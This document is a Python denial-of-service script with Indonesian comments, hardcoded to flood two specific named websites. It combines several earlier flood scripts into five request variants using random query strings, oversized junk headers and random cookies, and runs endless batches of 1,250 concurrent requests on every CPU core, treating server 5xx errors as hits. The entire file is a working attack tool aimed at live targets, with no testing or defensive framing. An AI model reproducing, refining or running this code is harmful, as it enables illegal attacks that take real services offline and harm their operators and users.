import asyncio
import aiohttp
import random
import string
import multiprocessing
import sys

# --- TARGET CONFIGURATION ---
# Lu bisa ganti targetnya di sini
TARGETS = ["https://inihari88.shop/", "https://inihari88.website/"]

def rs(length=30):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# --- VECTOR AGGREGATOR (Merging all your scripts) ---

async def vector_db_stress(session, t):
    """Logic from ddos.py & ddosms.py"""
    url = f"{t}?s={rs(15)}"
    async with session.get(url, timeout=5) as r:
        await r.content.read(1)

async def vector_juggernaut(session, t):
    """Logic from ddos1.py"""
    h = {"Large-Trash-Header": "X" * 2048, "Cookie": f"uid={rs(50)}"}
    async with session.get(t, headers=h, timeout=5) as r:
        await r.content.read(1)

async def vector_silent_killer(session, t):
    """Logic from ddos2.py (Optimized)"""
    async with session.get(t, timeout=10) as r:
        await r.content.read(1) 

async def vector_overlord(session, t):
    """Logic from ddos501.py"""
    url = f"{t}?t={random.random()}"
    async with session.get(url, timeout=5) as r:
        if r.status >= 500: print(f"[🔥] SERVER 5xx! -> {r.status}")

async def vector_cloud_cracker(session, t):
    """Logic from ddosms1.py"""
    url = f"{t}?s={rs(20)}&cat={random.randint(1,999)}"
    async with session.get(url, timeout=7) as r:
        await r.content.read(5)

# --- ENGINE CORE ---

def start_engine(target_url):
    # Buat event loop baru untuk setiap core
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def ignite():
        # Connector agresif tanpa limit
        connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=600)
        async with aiohttp.ClientSession(connector=connector) as session:
            print(f"[+] Engine-{multiprocessing.current_process().name} Ignited for {target_url}")
            while True:
                tasks = []
                # Tiap batch ngirim 1250 request campuran
                for _ in range(250): tasks.append(vector_db_stress(session, target_url))
                for _ in range(250): tasks.append(vector_juggernaut(session, target_url))
                for _ in range(250): tasks.append(vector_silent_killer(session, target_url))
                for _ in range(250): tasks.append(vector_overlord(session, target_url))
                for _ in range(250): tasks.append(vector_cloud_cracker(session, target_url))
                
                # Eksekusi serentak dan tangkap exception agar tidak stuck
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                success = sum(1 for r in results if not isinstance(r, Exception))
                print(f"[{multiprocessing.current_process().name}] Sent {success} Mixed Pellets | Target: {target_url}")
                
                # Jeda mikro agar CPU tidak hang total
                await asyncio.sleep(0.01)

    try:
        loop.run_until_complete(ignite())
    except:
        pass

if __name__ == "__main__":
    print("🔱 THE GODFATHER ULTIMATE FUSION IS ACTIVE 🔱")
    print(f"Nodes: {multiprocessing.cpu_count()} Cores | Mode: Full Annihilation")
    
    processes = []
    num_cores = multiprocessing.cpu_count()
    
    for i in range(num_cores):
        # Bagi tugas core: genap ke target 1, ganjil ke target 2
        target = TARGETS[0] if i % 2 == 0 else TARGETS[1]
        p = multiprocessing.Process(target=start_engine, args=(target,), name=f"Core-{i}")
        p.daemon = True
        p.start()
        processes.append(p)
    
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Godfather is retiring. All processes terminated.")
